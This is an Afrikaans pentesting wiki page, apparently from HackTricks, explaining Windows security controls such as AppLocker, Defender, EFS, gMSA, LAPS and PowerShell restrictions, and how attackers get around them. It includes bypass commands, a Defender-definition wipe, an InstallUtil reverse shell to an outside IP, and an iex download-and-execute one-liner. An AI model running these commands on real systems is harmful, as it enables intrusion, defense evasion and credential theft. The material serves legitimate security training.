# Windows-sekuriteitskontroles

{{#include ../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Application whitelist is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om op 'n stelsel teenwoordig te wees en uitgevoer te word. Die doel is om die omgewing teen skadelike malware en nie-goedgekeurde sagteware te beskerm wat nie by die spesifieke besigheidsbehoeftes van 'n organisasie aansluit nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **application whitelisting solution** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **granular control** oor uitvoerbare lêers, scripts, Windows-installeerderlêers, DLLs, verpakte toepassings en verpakte toepassing-installeerders.\
Dit is algemeen vir organisasies om **cmd.exe en PowerShell.exe te blokkeer** en skryftoegang tot sekere gidse te beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die blacklist/whitelist is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, wat ’n manier bied om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **Writable folders** om AppLocker Policy te bypass: Indien AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **writable folders** wat jy kan gebruik om dit te **bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swakgeskrewe reëls kan ook omseil word**
- Byvoorbeeld, met **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** kan jy ’n **folder genaamd `allowed`** enige plek skep, en dit sal toegelaat word.
- Organisasies fokus ook dikwels daarop om die **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** te **blokkeer**, maar vergeet van die **ander** [**PowerShell executable-liggings**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement** word baie selde enabled weens die bykomende las wat dit op ’n system kan plaas, asook die hoeveelheid testing wat nodig is om te verseker dat niks sal breek nie. Daarom sal die gebruik van **DLLs as backdoors help om AppLocker te omseil**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-code in enige process uit te voer en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Berging van credentials

### Security Accounts Manager (SAM)

Local credentials is in hierdie file teenwoordig; die passwords is gehash.

### Local Security Authority (LSA) - LSASS

Die **credentials** (gehash) word om Single Sign-On-redes in die **memory** van hierdie subsystem **gestoor**.\
**LSA** administreer die plaaslike **security policy** (password policy, users se permissions...), **authentication**, **access tokens**...\
LSA sal die een wees wat vir verskafde credentials binne die **SAM**-file **check** (vir ’n plaaslike login) en met die **domain controller** **praat** om ’n domain user te authenticate.

Die **credentials** word binne die **LSASS-process** **gestoor**: Kerberos tickets, NT- en LM-hashes, maklik decrypted passwords.

### LSA secrets

LSA kan sommige credentials op disk stoor:

- Password van die computer account van die Active Directory (onbereikbare domain controller).
- Passwords van die accounts van Windows services
- Passwords vir scheduled tasks
- Meer (password van IIS applications...)

### NTDS.dit

Dit is die database van die Active Directory. Dit is slegs in Domain Controllers teenwoordig.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n Antivirus wat in Windows 10 en Windows 11, asook in weergawes van Windows Server, beskikbaar is. Dit **blokkeer** algemene pentesting tools soos **`WinPEAS`**. Daar is egter maniere om hierdie **protections te omseil**.

### Check

Om die **status** van **Defender** te check, kan jy die PS cmdlet **`Get-MpComputerStatus`** uitvoer (check die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate, kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS beveilig lêers deur middel van encryption, met gebruik van 'n **symmetric key** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **public key** encrypted en binne die encrypted lêer se $EFS **alternative data stream** gestoor. Wanneer decryption nodig is, word die ooreenstemmende **private key** van die gebruiker se digital certificate gebruik om die FEK vanaf die $EFS stream te decrypt. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.

**Decryption scenarios without user initiation** sluit die volgende in:

- Wanneer lêers of vouers na 'n nie-EFS file system, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), verskuif word, word hulle outomaties decrypted.
- Encrypted lêers wat oor die network via SMB/CIFS protocol gestuur word, word voor transmission decrypted.

Hierdie encryption method maak **transparent access** tot encrypted lêers vir die eienaar moontlik. Om egter bloot die eienaar se password te verander en aan te meld, sal nie decryption toelaat nie.

**Key Takeaways**:

- EFS gebruik 'n symmetric FEK wat met die gebruiker se public key encrypted is.
- Decryption gebruik die gebruiker se private key om toegang tot die FEK te verkry.
- Automatic decryption vind onder spesifieke toestande plaas, soos copying na FAT32 of network transmission.
- Encrypted lêers is vir die eienaar accessible sonder addisionele stappe.

### Check EFS info

Kontroleer of 'n **user** hierdie **service** **used** het deur te kontroleer of hierdie path bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **who** **access** tot die lêer het met cipher /c \<file>\
Jy kan ook `cipher /e` en `cipher /d` binne 'n folder gebruik om al die lêers te **encrypt** en **decrypt**

### Decrypting EFS files

#### Being Authority System

Hierdie benadering vereis dat die **victim user** 'n **process** op die host **running** het. Indien wel, kan jy vanuit 'n `meterpreter` session die gebruiker se process token impersonate (`impersonate_token` from `incognito`). Alternatiewelik kan jy na die gebruiker se process `migrate`.

#### Knowing the User's Password

Mimikatz kan die gebruiker se certificate en private key import, en dit dan gebruik om EFS-protected lêers te decrypt.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van service accounts in IT-infrastructures te vereenvoudig. Anders as tradisionele service accounts wat dikwels die "**Password never expire**"-setting enabled het, bied gMSAs 'n veiliger en meer manageable oplossing:

- **Automatic Password Management**: gMSAs gebruik 'n komplekse 240-character password wat outomaties verander volgens domain- of computer policy. Hierdie process word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan manual password updates uitskakel.
- **Enhanced Security**: Hierdie accounts is immuun teen lockouts en kan nie vir interactive logins gebruik word nie, wat hul security verbeter.
- **Multiple Host Support**: gMSAs kan oor multiple hosts shared word, wat hulle ideaal maak vir services wat op multiple servers running is.
- **Scheduled Task Capability**: Anders as managed service accounts, ondersteun gMSAs die running van scheduled tasks.
- **Simplified SPN Management**: Die system update outomaties die Service Principal Name (SPN) wanneer daar changes aan die rekenaar se sAMaccount-details of DNS name is, wat SPN management vereenvoudig.

Die passwords vir gMSAs word in die LDAP property _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) reset. Hierdie password, 'n encrypted data blob bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur authorized administrators en die servers waarop die gMSAs installed is, retrieved word, wat 'n secure environment verseker. Om toegang tot hierdie information te verkry, word 'n secured connection soos LDAPS vereis, of die connection moet met 'Sealing & Secure' authenticated wees.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Jy kan hierdie password met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** lees.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie plasing**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om 'n **NTLM relay attack** uit te voer om die **wagwoord** van **gMSA** te **lees**.<sup>[[3]](#references)</sup>

## LAPS

Die **Local Administrator Password Solution (LAPS)**, wat van [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) afgelaai kan word, maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **ewekansig gegenereer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs tot gemagtigde gebruikers beperk. Met voldoende toestemmings kan plaaslike admin-wagwoorde gelees word.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die kenmerke af** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-objects, die slegs-toelating van goedgekeurde .NET-tipes, XAML-gebaseerde workflows, PowerShell-klasse, en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compileer, mag jy nodig hê** **om** _**'n Verwysing by te voeg**_ -> _Blaai_ ->_Blaai_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die beperkte modus te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS-uitvoeringsbeleid

Dit is by verstek op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> gevind word

## Security Support Provider Interface (SSPI)

Is die API wat gebruik kan word om gebruikers te authenticateer.

Die SSPI sal verantwoordelik wees om die toepaslike protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Daarna sal die SSPI onderhandel oor watter authentication-protokol gebruik sal word. Hierdie authentication-protokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van ’n DLL geleë, en albei masjiene moet dieselfde een ondersteun om te kan kommunikeer.

### Main SSPs

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Om kompatibiliteitsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webbedieners en LDAP, wagwoord in die vorm van ’n MD5-hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om oor die protokol te onderhandel wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een aanbied.

## UAC - Gebruikersrekeningbeheer

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n kenmerk wat ’n **toestemmingsaanvraag vir verhoogde aktiwiteite** moontlik maak.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Om AppLocker en PowerShell constrained language mode te omseil](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [hoe om EFS-lêers te dekripteer](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying vir gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 maniere om die PowerShell Execution Policy te omseil](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
